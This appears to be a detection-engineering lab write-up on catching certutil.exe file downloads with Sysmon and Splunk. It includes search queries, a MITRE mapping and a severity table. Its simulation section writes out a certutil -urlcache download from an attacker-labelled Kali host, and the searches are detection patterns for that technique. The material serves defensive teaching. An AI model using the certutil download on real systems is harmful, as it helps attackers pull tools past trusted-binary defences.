# certutil file download detection

Description: Detecting file download activity using certutil.exe and Sysmon telemetry

# 📥 Certutil File Download Detection

<div align="center">

![Log Source](https://img.shields.io/badge/Log%20Source-Sysmon%20%7C%20Defender-blue)
![Event ID](https://img.shields.io/badge/Event%20ID-1-orange)
![SIEM](https://img.shields.io/badge/SIEM-Splunk-green)
![MITRE](https://img.shields.io/badge/MITRE-T1105%20%7C%20T1218-red)
![Status](https://img.shields.io/badge/Status-Validated-brightgreen)

</div>

---

## 📋 Table of Contents

* [Detection Summary](#-detection-summary)
* [Lab Details](#-lab-details)
* [MITRE ATT&CK Mapping](#-mitre-attck-mapping)
* [Splunk Search](#-splunk-search)
* [Simulation](#-simulation)
* [Analyst Review](#-analyst-review)
* [Severity](#-severity)
* [False Positives](#-false-positives)
* [Validation Evidence](#-validation-evidence)
* [Conclusion](#-conclusion)

---

## 🎯 Detection Summary

This detection identifies suspicious file download activity using `certutil.exe`. I tested it on `Target-PC` by downloading a harmless text file from a Kali web server and validating the activity in Splunk. The goal was to confirm that Sysmon captured the certutil process execution and command line, including the remote URL, destination IP, and downloaded file path.

---

## 🧪 Lab Details

| Field             | Details                       |
| ----------------- | ----------------------------- |
| Host              | `Target-PC`                   |
| Attacker          | Kali Linux                    |
| Remote IP         | `192.168.10.250`              |
| Remote Port       | `8000`                        |
| Downloaded File   | `update.txt`                  |
| Tool Used         | `certutil.exe`                |
| Log Sources       | Sysmon and Microsoft Defender |
| Primary Event ID  | Sysmon Event ID `1`           |
| Optional Event ID | Sysmon Event ID `3`           |
| SIEM              | Splunk                        |
| Index             | `endpoint`                    |

---

## 🧭 MITRE ATT&CK Mapping

| Tactic              | Technique                           | Reason                                                                        |
| ------------------- | ----------------------------------- | ----------------------------------------------------------------------------- |
| Command and Control | T1105 Ingress Tool Transfer         | Certutil was used to download content from a remote web server                |
| Defense Evasion     | T1218 System Binary Proxy Execution | Certutil is a trusted Windows binary that can be abused for download activity |

---

## 🔎 Splunk Search

```spl
index=endpoint host="Target-PC" source="*Sysmon*"
("certutil.exe" OR "urlcache" OR "http://" OR "update.txt" OR "192.168.10.250")
| table _time EventCode EventID host ComputerName Image CommandLine DestinationIp DestinationPort ParentImage User _raw
| sort -_time
```

### Process Creation Search

```spl
index=endpoint host="Target-PC" source="*Sysmon*" EventCode=1
| search Image="*certutil.exe" OR CommandLine="*urlcache*" OR CommandLine="*http*"
| table _time host ComputerName User Image ParentImage CommandLine
| sort -_time
```

### Network Search

```spl
index=endpoint host="Target-PC" source="*Sysmon*" EventCode=3
| search Image="*certutil.exe" OR DestinationIp="192.168.10.250"
| table _time host ComputerName Image DestinationIp DestinationPort Protocol User
| sort -_time
```

---

## ⚔️ Simulation

A harmless text file was hosted on Kali using Python's built-in web server.

```bash
mkdir -p /home/kali/certutil-test
cd /home/kali/certutil-test
echo 'certutil download test file' > update.txt
python3 -m http.server 8000
```

The file was downloaded from `Target-PC` using `certutil.exe`.

```cmd
certutil.exe -urlcache -f http://192.168.10.250:8000/update.txt C:\Windows\Temp\update.txt
```

Cleanup command:

```cmd
del C:\Windows\Temp\update.txt
```

This test downloaded a harmless text file and was only used to generate detection telemetry.

---

## 🕵️ Analyst Review

Splunk returned Sysmon telemetry showing `certutil.exe` execution from `Target-PC`. The command line included `-urlcache`, `-f`, a remote HTTP URL, and the destination file path.

Certutil is a trusted Windows binary, which makes this behavior important to review. In this lab, the downloaded file was harmless, but in a real investigation I would review the full command line, parent process, destination IP, downloaded file path, Defender response, and whether the file executed afterward.

---

## 🚦 Severity

| Severity | Condition                                                                                                                |
| -------- | ------------------------------------------------------------------------------------------------------------------------ |
| High     | Certutil downloads a file from a remote host                                                                             |
| High     | Destination is unknown or external                                                                                       |
| High     | File is saved to Temp, Downloads, or AppData                                                                             |
| High     | Downloaded file executes afterward                                                                                       |
| High     | Defender or EDR generates an alert                                                                                       |
| High     | Activity appears near PowerShell, scheduled tasks, new services, Defender tampering, LSASS access, or event log clearing |

---

## ⚠️ False Positives

| Possible Cause         | Notes                                      |
| ---------------------- | ------------------------------------------ |
| Admin troubleshooting  | Approved use of certutil                   |
| Certificate management | Legitimate certificate-related activity    |
| Internal IT scripts    | Approved automation                        |
| Software deployment    | Known deployment workflow                  |
| Security testing       | Authorized testing                         |
| Lab testing            | Expected activity from this detection test |

---

## 📸 Validation Evidence

### Certutil Download Command or Defender Block Alert

<img width="475" height="378" alt="13_certutil_download_command_or_defender_block" src="https://github.com/user-attachments/assets/6e5d7f77-6ef3-4544-a846-916b18bb76ec" />

### Raw Sysmon Evidence Showing Certutil Process Creation or Related Telemetry

<img width="624" height="233" alt="13_raw_sysmon_certutil_process_creation" src="https://github.com/user-attachments/assets/b7911494-6acf-4dd6-a99e-8286e8d20c40" />

### Splunk Detection Query Identifying Certutil Download Indicators

<img width="624" height="238" alt="13_certutil_download_detection" src="https://github.com/user-attachments/assets/d6103fca-f049-4f66-98c0-49e74bf7afa9" />

---

## ✅ Conclusion

This detection confirmed `certutil.exe` file download behavior from `Target-PC` to the Kali web server. The lab download was harmless, but the behavior is high value because certutil is a trusted Windows binary that attackers can abuse to retrieve tools, scripts, or payloads. In a real SOC investigation, I would review the command line, remote URL, destination IP, downloaded file path, parent process, Defender response, and any follow-on execution.
